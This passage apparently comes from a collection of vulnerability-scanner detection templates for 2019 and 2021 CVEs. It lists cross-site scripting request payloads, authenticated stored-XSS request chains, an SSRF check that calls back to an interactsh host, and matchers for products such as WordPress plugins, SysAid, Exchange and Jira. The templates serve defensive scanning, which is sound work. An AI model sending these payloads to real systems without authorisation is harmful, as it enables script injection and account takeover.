- {{BaseURL}}/tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1
- {{BaseURL}}/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Clansphere CMS 2011.4 - Cross-Site Scripting
## Description
- Clansphere CMS 2011.4 contains an unauthenticated reflected cross-site scripting vulnerability via the "language" parameter.
- severity - medium
- tags - xss,cve,cve2021,clansphere
## Requests
- Method - GET
### URL
- {{BaseURL}}/clansphere/mods/clansphere/lang_modvalidate.php?language=language%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&module=module
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SysAid 20.4.74 - Cross-Site Scripting
## Description
- SysAid 20.4.74 contains a reflected cross-site scripting vulnerability via the KeepAlive.jsp stamp parameter.
- severity - medium
- tags - cve,cve2021,xss,sysaid
## Requests
- Method - GET
### URL
- {{BaseURL}}/KeepAlive.jsp?stamp=%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - dsl**
- dsl
    1. (body == "false \<script>alert(document.domain)\</script>")
    2. status_code == 200
- condition - and

---
# WordPress Bello Directory & Listing Theme \<1.6.0 - Cross-Site Scripting
## Description
- WordPress Bello Directory & Listing theme before 1.6.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape the listing_list_view, bt_bb_listing_field_my_lat, bt_bb_listing_field_my_lng, bt_bb_listing_field_distance_value, bt_bb_listing_field_my_lat_default, bt_bb_listing_field_keyword, bt_bb_listing_field_location_autocomplete, bt_bb_listing_field_price_range_from and bt_bb_listing_field_price_range_to parameters in the ints listing page.
- severity - medium
- tags - cve2021,wordpress,xss,wp-plugin,wpscan,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Vehicle Service Management System - Stored Cross-Site Scripting
## Description
- A Stored Cross Site Scripting (XSS) vulnerability exists in Vehicle Service Management System 1.0 via the My Account Section in login panel.

- severity - medium
- tags - cve,cve2021,xss,vms,authenticated
## Requests
### Step - 1
```
POST /classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{username}}&password={{password}}

```
### Step - 2
```
POST /classes/Users.php?f=save HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id=1&firstname=Administrator%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&lastname=Admin&username=admin

```
### Step - 3
```
GET /admin/?page=user HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, 'text/html')
    2. status_code_3 == 200
    3. contains(body_3, "Administrator\">\<script>alert(document.domain)\</script> Admin")
- condition - and

---
# Accela Civic Platform \<=21.1 - Cross-Site Scripting
## Description
- Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via  ssoAdapter/logoutAction.do successURL.
- severity - medium
- tags - xss,redirect,cve,cve2021,accela,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://interact.sh/
### Matchers

**Type - regex**
- regex
    1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)interact\.sh.*$
- part - header

---
# Customize Login Image \< 3.5.3 - Cross-Site Scripting
## Description
- A cross-site scripting (XSS) attack can cause arbitrary code (JavaScript) to run in a user's browser and can use an application as the vehicle for the attack. The XSS payload given in the "Custom logo link" executes whenever the user opens the Settings Page of the "Customize Login Image" Plugin.

- severity - medium
- tags - wpscan,cve2021,wordpress,customize-login-image,wp,authenticated,cve,wp-plugin,xss
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/options-general.php?page=customize-login-image/customize-login-image-options.php HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=<script>alert(document.domain)</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=

```
### Step - 4
```
GET /wp-login.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_4 == 200
    2. contains(all_headers_4, "text/html")
    3. contains(body_4, "Go to \<script>alert(document.domain)\</script>")
- condition - and
### Extractors

**Type - regex**
- name - nonce
- part - body
- group - 1
- regex
    1. name="_wpnonce" value="([0-9a-zA-Z]+)"
- internal - True

---
# Adminer \<=4.8.0 - Cross-Site Scripting
## Description
- Adminer 4.6.1 to 4.8.0 contains a cross-site scripting vulnerability which affects users of MySQL, MariaDB, PgSQL, and SQLite in browsers without CSP when Adminer uses a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled).
- severity - medium
- tags - cve,cve2021,adminer,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# MaxSite CMS Cross-Site Scripting
## Description
- A reflected cross-site scripting vulnerability in MaxSite CMS before V106 via product/page/* allows remote attackers to inject arbitrary web script to a page."
- severity - medium
- tags - cve,cve2021,maxsite,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Admidio - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability is present in Admidio prior to version 4.0.12. The reflected cross-site scripting vulnerability occurs because redirect.php does not properly validate the value of the url parameter. Through this vulnerability, an attacker is capable to execute malicious scripts.
- severity - medium
- tags - cve,cve2021,admidio,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)
### Matchers

**Type - word**
- part - body
- words
    1. please click \<a href="javascript://%0aalert(document.domain)" target="_self">

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Photo Gallery by 10Web \<1.5.69 - Cross-Site Scripting
## Description
- WordPress Photo Gallery by 10Web plugin before 1.5.69 contains multiple reflected cross-site scripting vulnerabilities via the gallery_id, tag, album_id and theme_id GET parameters passed to the bwg_frontend_data AJAX action, available to both unauthenticated and authenticated users.

- severity - medium
- tags - photo,wpscan,packetstorm,cve,cve2021,xss,wordpress,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. onmouseover=alert(document.domain)//
    2. wp-content/uploads/photo-gallery
- condition - and

---
# WordPress Car Repair Services & Auto Mechanic Theme \<4.0 - Cross-Site Scripting
## Description
- WordPress Car Repair Services & Auto Mechanic before 4.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the serviceestimatekey parameter before outputting it back in the page.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress JNews Theme \<8.0.6 - Cross-Site Scripting
## Description
- WordPress JNews theme before 8.0.6 contains a reflected cross-site scripting vulnerability. It does not sanitize the cat_id parameter in the POST request /?ajax-request=jnews (with action=jnews_build_mega_category_*).
- severity - medium
- tags - cve2021,wordpress,xss,wp-plugin,wpscan,cve
## Requests
### Step - 1
```
POST /?ajax-request=jnews HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67

```
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. Content-Type: text/html
- part - header

**Type - status**
- status
    1. 200

---
# WordPress Realteo \<=1.2.3 - Cross-Site Scripting
## Description
- WordPress Realteo plugin 1.2.3 and prior contains an unauthenticated reflected cross-site scripting vulnerability due to improper sanitization of keyword_search, search_radius. _bedrooms and _bathrooms GET parameters before outputting them in its properties page.
- severity - medium
- tags - cve,cve2021,realteo,xss,wordpress,plugin,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/properties/?keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/{{randstr}}/)%3B%2F%2F
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. autofocus onfocus=alert(/{{randstr}}/);//
    2. Nothing found
- part - body
- condition - and

**Type - word**
- words
    1. text/html
- part - header

---
# ClinicCases 7.3.3 Cross-Site Scripting
## Description
- ClinicCases 7.3.3 is susceptible to multiple reflected cross-site scripting vulnerabilities that could allow unauthenticated attackers to introduce arbitrary JavaScript by crafting a malicious URL. This can result in account takeover via session token theft.
- severity - medium
- tags - xss,cve,cve2021,cliniccases
## Requests
- Method - GET
### URL
- {{BaseURL}}/cliniccases/lib/php/data/messages_load.php?type=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zoho ManageEngine ADSelfService Plus \<=6103 - Cross-Site Scripting
## Description
- Zoho ManageEngine ADSelfService Plus 6103 and prior contains a reflected cross-site scripting vulnerability on the loadframe page.
- severity - medium
- tags - cve,cve2021,zoho,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/LoadFrame?frame_name=x&src=x&single_signout=x%27%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. >\</iframe>\<script>alert(1)\</script>
    2. adsf/js/
- condition - and

---
# Gryphon Tower - Cross-Site Scripting
## Description
- Gryphon Tower router web interface contains a reflected cross-site scripting vulnerability in the url parameter of the /cgi-bin/luci/site_access/ page. An attacker can exploit this issue by tricking a user into following a specially crafted link, granting the attacker JavaScript execution in the victim's browser.
- severity - medium
- tags - xss,tenable,cve,cve2021,gryphon
## Requests
- Method - GET
### URL
- {{BaseURL}}/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. onfocus=alert(document.domain) autofocus=1>
    2. Send Access Request URL
- condition - and

---
# Resourcespace - Cross-Site Scripting
## Description
- ResourceSpace before 9.6 rev 18290 is affected by a reflected cross-site scripting vulnerability in plugins/wordpress_sso/pages/index.php via the wordpress_user parameter.
- severity - medium
- tags - cve,cve2021,xss,resourcespace
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E
### Matchers

**Type - word**
- words
    1. TEST\<script>alert(1)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Microsoft Exchange Server Pre-Auth POST Based Cross-Site Scripting
## Description
- Microsoft Exchange Server is vulnerable to a spoofing vulnerability. Be aware this CVE ID is unique from CVE-2021-42305.
- severity - medium
- tags - cve,cve2021,xss,microsoft,exchange
## Requests
### Step - 1
```
POST /autodiscover/autodiscover.json HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1

```
### Matchers

**Type - word**
- words
    1. alert(document.domain);
    2. a=""
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. A potentially dangerous Request.Form value was detected from the client
- negative - True

**Type - status**
- status
    1. 500

---
# Clansphere CMS 2011.4 - Cross-Site Scripting
## Description
- Clansphere CMS 2011.4 contains an unauthenticated reflected cross-site scripting vulnerability via the  "module" parameter.

- severity - medium
- tags - cve,cve2021,clansphere,xss,cms,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/mods/clansphere/lang_modvalidate.php?language=language&module=module%22>\</script>\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. ">\</script>\<script>alert(document.domain)\</script>.php

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Wordpress Marmoset Viewer \<1.9.3 - Cross-Site Scripting
## Description
- WordPress Marmoset Viewer plugin before 1.9.3 contains a cross-site scripting vulnerability. It does not property sanitize, validate, or escape the 'id' parameter before outputting back in the page.
- severity - medium
- tags - xss,wpscan,cve,cve2021,wp-plugin,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://\</script>\<svg/onload=alert(%27{{randstr}}%27)>
- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \</script>\<svg/onload=alert('{{randstr}}')>
    2. alert(/{{randstr}}/)
- part - body
- condition - or

**Type - word**
- words
    1. Marmoset Viewer

---
# SysAid Technologies 20.3.64 b14 - Cross-Site Scripting
## Description
- SysAid 20.3.64 b14 contains a cross-site scripting vulnerability via the /KeepAlive.jsp?stamp= URI.
- severity - medium
- tags - cve,cve2021,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/KeepAlive.jsp?stamp=16170297%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# myfactory FMS  -  Cross-Site Scripting
## Description
- myfactory.FMS before 7.1-912 allows cross-site scripting via the UID parameter.
- severity - medium
- tags - cve,cve2021,myfactory,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# HotelDruid 2.3.0 - Cross-Site Scripting
## Description
- HotelDruid 2.3.0 contains a cross-site scripting vulnerability affecting nsextt, cambia1, mese_fine, origine, and anno parameters in creaprezzi.php, tabella3.php, personalizza.php, and visualizza_tabelle.php.
- severity - medium
- tags - packetstorm,cve,cve2019,xss,hoteldruid,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/hoteldruid/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=prenotazioni&subtotale_selezionate=1&num_cambia_pren=1&cerca_id_passati=1&cambia1=3134671%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. "\</script>\<script>alert(document.domain)\</script>">\<input
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# WordPress Checklist \<1.1.9 - Cross-Site Scripting
## Description
- WordPress Checklist plugin before 1.1.9 contains a cross-site scripting vulnerability. The fill parameter is not correctly filtered in the checklist-icon.php file.
- severity - medium
- tags - xss,wp-plugin,packetstorm,cve,cve2019,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Visualizer \<3.3.1 - Blind Server-Side Request Forgery
## Description
- Visualizer prior to 3.3.1 suffers from a blind server-side request forgery vulnerability via the /wp-json/visualizer/v1/upload-data endpoint.

- severity - critical
- tags - cve,cve2019,wp-plugin,ssrf,wordpress,xss,unauth,wpscan
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/wp-json/visualizer/v1/upload-data
  - {\"url\":\"http://{{interactsh-url}}\"}
### Matchers

**Type - word**
- part - interactsh_protocol
- name - http
- words
    1. http

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# WordPress Visualizer \<3.3.1 - Cross-Site Scripting
## Description
- WordPress Visualizer plugin before 3.3.1 contains a stored cross-site scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint. An unauthenticated attacker can execute arbitrary JavaScript when an admin or other privileged user edits the chart via the admin dashboard.

- severity - medium
- tags - cve,cve2019,wp-plugin,wordpress,wp,xss,unauth,wpscan
## Requests
### Step - 1
```
POST /wp-json/visualizer/v1/update-chart HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}

```
### Matchers

**Type - word**
- part - body
- words
    1. {"success":"Chart updated"}

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# Rumpus FTP Web File Manager 8.2.9.1 - Cross-Site Scripting
## Description
- Rumpus FTP Web File Manager 8.2.9.1 contains a reflected cross-site scripting vulnerability via the Login page. An attacker can send a crafted link to end users and can execute arbitrary JavaScript.
- severity - medium
- tags - xss,ftp,packetstorm,cve,cve2019
## Requests
- Method - GET
### URL
- {{BaseURL}}/Login?!'>\<sVg/OnLoAD=alert`1337`//
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. value=''>\<sVg/OnLoAD=alert`1337`//'>
- part - body

---
# WordPress UserPro 4.9.32 - Cross-Site Scripting
## Description
- WordPress UserPro 4.9.32 is vulnerable to reflected cross-site scripting because the Instagram PHP API (v2) it relies on allows it via the example/success.php error_description parameter.
- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,packetstorm,cve,cve2019
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(1)>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Yuzo \<5.12.94 - Cross-Site Scripting
## Description
- WordPress Yuzo Related Posts plugin before 5.12.94 is vulnerable to cross-site scripting
because it mistakenly expects that is_admin() verifies that the
request comes from an admin user (it actually only verifies that the
request is for an admin page). An unauthenticated attacker can consequently inject
a payload into the plugin settings, such as the
yuzo_related_post_css_and_style setting.

- severity - medium
- tags - wpscan,cve,cve2019,wordpress,wp-plugin,xss
## Requests
### Step - 1
```
POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

yuzo_related_post_css_and_style=</style><script>alert(0);</script>

```
### Step - 2
```
GET / HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, "\<script>alert(0);\</script>")

**Type - dsl**
- dsl
    1. contains(tolower(all_headers_2), 'text/html')

---
# WordPress Hero Maps Premium \<=2.2.1 - Cross-Site Scripting
## Description
- WordPress Hero Maps Premium plugin 2.2.1 and prior contains an unauthenticated reflected cross-site scripting vulnerability via the views/dashboard/index.php p parameter.
- severity - medium
- tags - wpscan,cve,cve2019,wordpress,xss,wp-plugin,maps
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. foo">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# LabKey Server Community Edition \<18.3.0 - Cross-Site Scripting
## Description
- LabKey Server Community Edition before 18.3.0-61806.763 contains a reflected cross-site scripting vulnerability via the onerror parameter in the /__r2/query endpoints, which allows an unauthenticated remote attacker to inject arbitrary JavaScript.
- severity - medium
- tags - cve,cve2019,xss,labkey,tenable
## Requests
- Method - GET
### URL
- {{BaseURL}}/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WebPort 1.19.1 - Cross-Site Scripting
## Description
- Web Port 1.19.1 is vulnerable to cross-site scripting via the /log type parameter.
- severity - medium
- tags - cve,cve2019,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. "\</script>\<script>alert(document.domain);\</script>\<script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# LiveZilla Server 8.0.1.0 - Cross-Site Scripting
## Description
- LiveZilla Server 8.0.1.0 is vulnerable to reflected cross-site scripting.

- severity - medium
- tags - xss,edb,packetstorm,cve,cve2019,livezilla
## Requests
- Method - GET
### URL
- {{BaseURL}}/mobile/index.php
### Matchers

**Type - word**
- part - body
- words
    1. var detectedLanguage = ';alert(document.domain)//';

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# MindPalette NateMail 3.0.15 - Cross-Site Scripting
## Description
- MindPalette NateMail 3.0.15 is susceptible to reflected cross-site scripting which could allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.
- severity - medium
- tags - cve,cve2019,natemail,xss
## Requests
### Step - 1
```
POST /NateMail.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

---
# Linear eMerge E3 - Cross-Site Scripting
## Description
- Linear eMerge E3-Series devices are vulnerable to cross-site scripting via the 'layout' parameter.

- severity - medium
- tags - emerge,xss,packetstorm,cve,cve2019,nortek
## Requests
- Method - GET
### URL
- {{BaseURL}}/badging/badge_template_v0.php?layout=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. Template : \<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress CTHthemes - Cross-Site Scripting
## Description
- WordPress CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes contain reflected cross-site scripting vulnerabilities via a search query.

- severity - medium
- tags - wp-theme,wpscan,cve,cve2019,wordpress,citybook,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?search_term=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&location_search=&nearby=off&address_lat=&address_lng=&distance=10&lcats%5B%5D=
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
    2. /wp-content/themes/citybook
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Woody Ad Snippets \<2.2.5 - Cross-Site Scripting/Remote Code Execution
## Description
- WordPress Woody Ad Snippets prior to 2.2.5 is susceptible to cross-site scripting and remote code execution via admin/includes/class.import.snippet.php, which allows unauthenticated options import as demonstrated by storing a cross-site scripting payload for remote code execution.

- severity - high
- tags - cve,cve2019,wordpress,wp-plugin,xss,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/insert-php/readme.txt
### Matchers

**Type - word**
- part - body
- words
    1. 2.2.5
- negative - True

**Type - word**
- part - body
- words
    1. Changelog

**Type - word**
- part - body
- words
    1. Woody ad snippets

**Type - status**
- status
    1. 200

---
# WordPress Sell Media 2.4.1 - Cross-Site Scripting
## Description
- WordPress Plugin Sell Media v2.4.1 contains a cross-site scripting vulnerability in /inc/class-search.php that allows remote attackers to inject arbitrary web script or HTML via the keyword parameter (aka $search_term or the Search field).
- severity - medium
- tags - cve,cve2019,wordpress,wp-plugin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/sell-media-search/?keyword=%22%3E%3Cscript%3Ealert%281337%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. id="sell-media-search-text" class="sell-media-search-text"
    2. alert(1337)
- condition - and
- part - body

**Type - status**
- status
    1. 200

---
# Zyxel - Cross-Site Scripting
## Description
- Zyxel ATP200, ATP500, ATP800, USG20-VPN, USG20W-VPN, USG40, USG40W, USG60, USG60W, USG110, USG210, USG310, USG1100, USG1900, USG2200-VPN, ZyWALL 110, ZyWALL 310, and ZyWALL 1100 devices contain a reflected cross-site scripting vulnerability on the security firewall login page via the mp_idx parameter.
- severity - medium
- tags - zyxel,packetstorm,seclists,edb,cve,cve2019,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?mp_idx=%22;alert(%271%27);//
### Matchers

**Type - word**
- part - body
- words
    1. ";alert('1');//
    2. \<title>Welcome\</title>
- condition - and

---
# phpMyChat-Plus 1.98 - Cross-Site Scripting
## Description
- phpMyChat-Plus 1.98 contains a cross-site scripting vulnerability via pmc_username parameter of pass_reset.php in password reset URL.

- severity - medium
- tags - cve,cve2019,phpMyChat,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/plus/pass_reset.php?L=english&pmc_username=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C
### Matchers

**Type - word**
- part - body
- words
    1. username = "\</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Jira \< 8.1.1 - Cross-Site Scripting
## Description
- Jira before 8.1.1 contains a cross-site scripting vulnerability via ConfigurePortalPages.jspa resource in the searchOwnerUserName parameter.

- severity - medium
- tags - cve,cve2019,atlassian,jira,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
### Matchers

**Type - word**
- part - body
- words
    1. '\<script>alert(1)\</script>' does not exist

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# MicroStrategy Library \<11.1.3 - Cross-Site Scripting
## Description
- MicroStrategy Library before 11.1.3 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve2019,microstrategy,packetstorm,xss,seclists,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/MicroStrategyLibrary/auth/ui/loginPage?loginMode=alert(document.domain)
### Matchers

**Type - word**
- part - body
- words
